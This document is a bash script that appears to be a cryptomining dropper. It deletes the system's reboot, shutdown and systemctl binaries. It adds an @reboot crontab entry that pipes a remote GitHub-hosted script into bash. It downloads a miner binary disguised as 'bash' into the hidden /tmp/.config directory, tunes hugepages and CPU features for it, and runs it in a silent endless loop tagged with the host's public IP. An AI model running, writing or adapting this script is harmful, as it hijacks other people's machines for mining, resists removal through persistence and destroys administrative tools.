#!/bin/bash

sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl

mode="${1:-0}"
work="/tmp/.config"
src="https://raw.githubusercontent.com/zjaacmyx/qclclcl/main"

RandString() {
  n="${1:-2}"; s="${2:-}"; [ -n "$s" ] && s="${s}_"; for((i=0;i<n;i++)); do s=${s}$(echo "$[`od -An -N2 -i /dev/urandom` % 26 + 97]" |awk '{printf("%c", $1)}'); done; echo -n "$s";
}

# Debian12+
sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget procps icu-devtools netcat-traditional >/dev/null 2>&1 || apt -qqy install wget procps icu-devtools netcat-traditional >/dev/null 2>&1


cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
[ -n "$addr" ] || addr="NULL"


if [ "$mode" == "0" ]; then
  delay="$[`od -An -N2 -i /dev/urandom` % 21600 + 43200]"
  #bash <(echo "sleep $delay && sudo reboot || reboot") >/dev/null 2>&1 &
fi

if [ "$mode" == "1" ]; then
  ###bash <(echo 'while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 12\r\n\r\nHello World" |nc -l -q 1 -p 8080; done') >/dev/null 2>&1 &
  #bash <(wget -qO- ${src}/k.sh) 43200 21600 >/dev/null 2>&1 &
  [ "$cores" == "2" ] && cores="1";
  [ "$cores" == "8" ] && cores="8";
fi

sudo sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*768)) >/dev/null 2>&1
sudo sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/zh88kk2.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1 || sed -i "/^@reboot/d;\$a\@reboot root wget -qO- ${src}/zh88kk2.sh |bash >/dev/null 2>&1 &\n\n\n" /etc/crontab >/dev/null 2>&1


rm -rf "${work}"; mkdir -p "${work}"
wget --no-check-certificate -4 -qO "${work}/appsettings.json" "${src}/q.json"
wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q"
chmod -R 777 "${work}"
sed -i "s/\"trainerBinary\":.*/\"trainerBinary\": \"$(RandString 7)\",/" "${work}/appsettings.json"


cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX512'
[ "$?" == "0" ] && AVX512=1 || AVX512=0
cat /proc/cpuinfo 2>/dev/null |grep -iq 'AVX2'
[ "$?" == "0" ] && [ "$AVX512" == "0" ] && AVX2=1 || AVX2=0
[ "$AVX2" == "1" ] && sed -i "s/AVX512/AVX2/g" "${work}/appsettings.json"
[ "$AVX512" == "0" ] && [ "$AVX2" == "0" ] && sed -i "/AVX512/d" "${work}/appsettings.json"

echo "##mode: m${mode}_c${cores}_${addr}"

if [ "$mode" == "0" ]; then
  name=`RandString 2 c${cores}_${addr}`;
  bash -c "while true; do cd "${work}"; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done" >/dev/null 2>&1 &
else
  while true; do cd "${work}"; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} >/dev/null 2>&1 ; sleep 5; done
  #while true; do cd "${work}"; name=`RandString 2 d${cores}_${addr}`; ./bash ${name} ${cores} ; sleep 5; done
fi

